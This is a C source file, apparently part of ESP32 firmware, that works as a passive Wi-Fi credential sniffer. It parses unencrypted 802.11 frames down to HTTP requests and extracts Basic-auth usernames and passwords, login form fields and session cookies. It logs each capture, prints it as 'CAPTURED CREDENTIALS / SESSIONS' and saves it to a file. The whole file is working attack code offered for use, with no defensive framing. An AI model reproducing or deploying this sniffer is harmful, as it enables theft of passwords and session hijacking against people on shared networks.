#include <stdatomic.h>
#include "cred_sniffer.h"
#include "wifi_sniffer.h"
#include "storage_sd.h"

#include "esp_timer.h"
#include "esp_heap_caps.h"

#include "freertos/FreeRTOS.h"
#include "freertos/semphr.h"

static const char *TAG = "cred_sniffer";

// ============================================================================
//  SECTION 10: CREDENTIAL / PLAINTEXT SNIFFER
// ============================================================================

static cred_hit_t g_creds[MAX_CREDS];
static uint16_t g_cred_count = 0;
static SemaphoreHandle_t g_cred_lock = NULL;
static atomic_bool g_creds_enabled = ATOMIC_VAR_INIT(false);

// ---- base64 decode (RFC 4648, no padding required) ----
static int b64_val(char c)
{
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

static size_t b64_decode(const char *in, char *out, size_t out_sz)
{
    size_t oi = 0;
    int val = 0, valb = -8;
    for (; *in && *in != '\r' && *in != '\n' && *in != ' '; in++) {
        int d = b64_val(*in);
        if (d < 0) continue;
        val = (val << 6) + d;
        valb += 6;
        if (valb >= 0) {
            if (oi + 1 >= out_sz) break;
            out[oi++] = (char)((val >> valb) & 0xFF);
            valb -= 8;
        }
    }
    out[oi] = '\0';
    return oi;
}

// ---- URL-decode a short field in place (max out_sz) ----
static void url_decode(const char *in, char *out, size_t out_sz)
{
    size_t oi = 0;
    for (size_t i = 0; in[i] && oi + 1 < out_sz; ) {
        if (in[i] == '%' && isxdigit((unsigned char)in[i+1]) &&
            isxdigit((unsigned char)in[i+2])) {
            char hex[3] = { in[i+1], in[i+2], 0 };
            out[oi++] = (char)strtol(hex, NULL, 16);
            i += 3;
        } else if (in[i] == '+') {
            out[oi++] = ' ';
            i++;
        } else {
            out[oi++] = in[i++];
        }
    }
    out[oi] = '\0';
}

// Extract value of key=...& from a query/body string
bool extract_kv(const char *hay, const char *key, char *out, size_t out_sz)
{
    size_t klen = strlen(key);
    const char *p = hay;
    while ((p = strstr(p, key)) != NULL) {
        // ensure start of a field (start or after & or ?)
        if (p != hay && p[-1] != '&' && p[-1] != '?' && p[-1] != '\n' && p[-1] != ' ') {
            p += klen;
            continue;
        }
        if (p[klen] != '=') { p += klen; continue; }
        p += klen + 1;
        size_t n = 0;
        while (p[n] && p[n] != '&' && p[n] != ' ' && p[n] != '\r' &&
               p[n] != '\n' && n + 1 < out_sz) n++;
        char tmp[96];
        if (n >= sizeof(tmp)) n = sizeof(tmp) - 1;
        memcpy(tmp, p, n);
        tmp[n] = '\0';
        url_decode(tmp, out, out_sz);
        return out[0] != '\0';
    }
    return false;
}

static void header_value(const char *headers, const char *name,
                         char *out, size_t out_sz)
{
    out[0] = '\0';
    const char *p = headers;
    size_t nlen = strlen(name);
    while (*p) {
        // case-insensitive start-of-line match
        bool match = true;
        for (size_t i = 0; i < nlen; i++) {
            if (tolower((unsigned char)p[i]) != tolower((unsigned char)name[i])) {
                match = false; break;
            }
        }
        if (match && p[nlen] == ':') {
            p += nlen + 1;
            while (*p == ' ') p++;
            size_t n = 0;
            while (p[n] && p[n] != '\r' && p[n] != '\n' && n + 1 < out_sz) n++;
            memcpy(out, p, n);
            out[n] = '\0';
            return;
        }
        // next line
        const char *nl = strstr(p, "\n");
        if (!nl) break;
        p = nl + 1;
    }
}

void creds_push(const cred_hit_t *hit)
{
    xSemaphoreTake(g_cred_lock, portMAX_DELAY);

    // Dedup: same host+user+pass already stored?
    for (int i = 0; i < g_cred_count; i++) {
        if (strcmp(g_creds[i].host, hit->host) == 0 &&
            strcmp(g_creds[i].user, hit->user) == 0 &&
            strcmp(g_creds[i].pass, hit->pass) == 0) {
            xSemaphoreGive(g_cred_lock);
            return;
        }
    }

    if (g_cred_count < MAX_CREDS) {
        g_creds[g_cred_count++] = *hit;
    } else {
        // overwrite oldest
        memmove(&g_creds[0], &g_creds[1], sizeof(cred_hit_t) * (MAX_CREDS - 1));
        g_creds[MAX_CREDS - 1] = *hit;
    }

    xSemaphoreGive(g_cred_lock);

    ESP_LOGW(TAG, "CRED HIT host=%s user=%s pass=%s",
             hit->host, hit->user[0] ? hit->user : "-",
             hit->pass[0] ? hit->pass : "-");
}

// Parse one HTTP request blob (headers + optional body)
static void creds_parse_http(const uint8_t *tcp, size_t tcp_len,
                             const uint8_t sip[4], const uint8_t dip[4])
{
    // Need at least "GET / HTTP/1.x\r\n"
    if (tcp_len < 16) return;
    if (!(tcp[0] == 'G' || tcp[0] == 'P' || tcp[0] == 'H' ||
          tcp[0] == 'O' || tcp[0] == 'D' || tcp[0] == 'T')) return;

    // Cap scan window
    size_t scan = tcp_len < 1500 ? tcp_len : 1500;
    char buf[1501];
    memcpy(buf, tcp, scan);
    buf[scan] = '\0';

    // Only care about requests with a Host header (real HTTP)
    char host[64] = {0};
    header_value(buf, "Host", host, sizeof(host));
    if (host[0] == '\0') return;

    cred_hit_t hit;
    memset(&hit, 0, sizeof(hit));
    snprintf(hit.host, sizeof(hit.host), "%s", host);
    memcpy(hit.src_ip, sip, 4);
    memcpy(hit.dst_ip, dip, 4);
    hit.time_us = esp_timer_get_time();

    // Path from request line
    const char *sp1 = strchr(buf, ' ');
    if (sp1) {
        sp1++;
        const char *sp2 = strchr(sp1, ' ');
        size_t plen = sp2 ? (size_t)(sp2 - sp1) : 0;
        if (plen > 0 && plen < sizeof(hit.path)) {
            memcpy(hit.path, sp1, plen);
            hit.path[plen] = '\0';
        }
    }

    // Cookie
    header_value(buf, "Cookie", hit.cookie, sizeof(hit.cookie));

    // Authorization: Basic base64(user:pass)
    char auth[128] = {0};
    header_value(buf, "Authorization", auth, sizeof(auth));
    if (strncmp(auth, "Basic ", 6) == 0 || strncmp(auth, "basic ", 6) == 0) {
        char decoded[96] = {0};
        b64_decode(auth + 6, decoded, sizeof(decoded));
        char *colon = strchr(decoded, ':');
        if (colon) {
            *colon = '\0';
            snprintf(hit.user, sizeof(hit.user), "%.47s", decoded);
            snprintf(hit.pass, sizeof(hit.pass), "%s", colon + 1);
        }
    }

    // Form fields in URL or body
    static const char *USER_KEYS[] = {
        "username=", "user=", "email=", "login=", "uid=", "id=", NULL
    };
    static const char *PASS_KEYS[] = {
        "password=", "pass=", "passwd=", "pwd=", "secret=", NULL
    };

    if (hit.user[0] == '\0') {
        for (int i = 0; USER_KEYS[i]; i++) {
            if (extract_kv(buf, USER_KEYS[i], hit.user, sizeof(hit.user))) break;
        }
    }
    if (hit.pass[0] == '\0') {
        for (int i = 0; PASS_KEYS[i]; i++) {
            if (extract_kv(buf, PASS_KEYS[i], hit.pass, sizeof(hit.pass))) break;
        }
    }

    bool interesting = (hit.user[0] || hit.pass[0] ||
                        (hit.cookie[0] && (strstr(hit.cookie, "session") ||
                                           strstr(hit.cookie, "PHPSESSID") ||
                                           strstr(hit.cookie, "auth"))));

    if (interesting) {
        creds_push(&hit);
    }
}

// Peel 802.11 data frame -> IPv4 -> TCP -> payload
void creds_feed_packet(const uint8_t *data, size_t len)
{
    if (!atomic_load(&g_creds_enabled) || data == NULL || len < 40) return;
    if ((data[0] & 0x0C) != 0x08) return;   // data only

    uint8_t subtype = (data[0] >> 4) & 0x0F;
    bool to_ds   = (data[1] & 0x01) != 0;
    bool from_ds = (data[1] & 0x02) != 0;
    size_t hdr = (subtype & 0x08) ? 26 : 24;
    if (to_ds && from_ds) hdr += 6;         // 4-address WDS

    // Protected frames are encrypted -- skip
    if (data[1] & 0x40) return;

    if (len < hdr + 8 + 20) return;

    // LLC/SNAP IPv4
    static const uint8_t SNAP_IP[8] = {0xAA,0xAA,0x03,0,0,0,0x08,0x00};
    if (memcmp(data + hdr, SNAP_IP, 8) != 0) return;

    const uint8_t *ip = data + hdr + 8;
    size_t ip_len = len - hdr - 8;
    if (ip_len < 20) return;
    if ((ip[0] >> 4) != 4) return;          // IPv4
    if (ip[9] != 6) return;                 // TCP only

    uint8_t ihl = (ip[0] & 0x0F) * 4;
    if (ihl < 20 || ip_len < ihl + 20) return;

    const uint8_t *sip = ip + 12;
    const uint8_t *dip = ip + 16;

    const uint8_t *tcp = ip + ihl;
    size_t tcp_len = ip_len - ihl;
    uint8_t doff = ((tcp[12] >> 4) & 0x0F) * 4;
    if (doff < 20 || tcp_len < doff) return;

    // Prefer dst port 80 / 8080 / 8000 / 3128, but also scan any cleartext
    uint16_t dport = (tcp[2] << 8) | tcp[3];
    uint16_t sport = (tcp[0] << 8) | tcp[1];
    bool likely_http = (dport == 80 || dport == 8080 || dport == 8000 ||
                        dport == 3128 || dport == 8888 ||
                        sport == 80 || sport == 8080);

    const uint8_t *payload = tcp + doff;
    size_t plen = tcp_len - doff;
    if (plen < 16) return;

    // Fast reject if it doesn't look like HTTP
    if (!(payload[0] == 'G' || payload[0] == 'P' || payload[0] == 'H' ||
          payload[0] == 'O' || payload[0] == 'D')) {
        if (!likely_http) return;
    }

    creds_parse_http(payload, plen, sip, dip);
}

esp_err_t creds_init(void)
{
    if (g_cred_lock == NULL) {
        g_cred_lock = xSemaphoreCreateMutex();
        if (g_cred_lock == NULL) return ESP_ERR_NO_MEM;
    }
    atomic_store(&g_creds_enabled, true);
    ESP_LOGI(TAG, "Credential sniffer ready");
    return ESP_OK;
}

void creds_set_enabled(bool on) { atomic_store(&g_creds_enabled, on); }
bool creds_is_enabled(void)     { return atomic_load(&g_creds_enabled); }
uint16_t creds_count(void)      { return g_cred_count; }

void creds_clear(void)
{
    xSemaphoreTake(g_cred_lock, portMAX_DELAY);
    g_cred_count = 0;
    memset(g_creds, 0, sizeof(g_creds));
    xSemaphoreGive(g_cred_lock);
}

void creds_print(void)
{
    xSemaphoreTake(g_cred_lock, portMAX_DELAY);
    printf("\n==== CAPTURED CREDENTIALS / SESSIONS (%u) ====\n", g_cred_count);
    for (int i = 0; i < g_cred_count; i++) {
        printf("[%d] host=%s path=%s\n", i + 1, g_creds[i].host, g_creds[i].path);
        printf("    src=%u.%u.%u.%u dst=%u.%u.%u.%u\n",
               g_creds[i].src_ip[0], g_creds[i].src_ip[1],
               g_creds[i].src_ip[2], g_creds[i].src_ip[3],
               g_creds[i].dst_ip[0], g_creds[i].dst_ip[1],
               g_creds[i].dst_ip[2], g_creds[i].dst_ip[3]);
        if (g_creds[i].user[0]) printf("    user=%s\n", g_creds[i].user);
        if (g_creds[i].pass[0]) printf("    pass=%s\n", g_creds[i].pass);
        if (g_creds[i].cookie[0]) printf("    cookie=%s\n", g_creds[i].cookie);
    }
    if (g_cred_count == 0) printf("(empty)\n");
    printf("==============================================\n");
    xSemaphoreGive(g_cred_lock);
}

esp_err_t creds_save(const char *path)
{
    if (path == NULL) return ESP_ERR_INVALID_ARG;
    FILE *f = fopen(path, "w");
    if (f == NULL) return ESP_FAIL;

    xSemaphoreTake(g_cred_lock, portMAX_DELAY);
    for (int i = 0; i < g_cred_count; i++) {
        fprintf(f, "host=%s\nuser=%s\npass=%s\ncookie=%s\npath=%s\n---\n",
                g_creds[i].host, g_creds[i].user, g_creds[i].pass,
                g_creds[i].cookie, g_creds[i].path);
    }
    xSemaphoreGive(g_cred_lock);
    fclose(f);
    return ESP_OK;
}
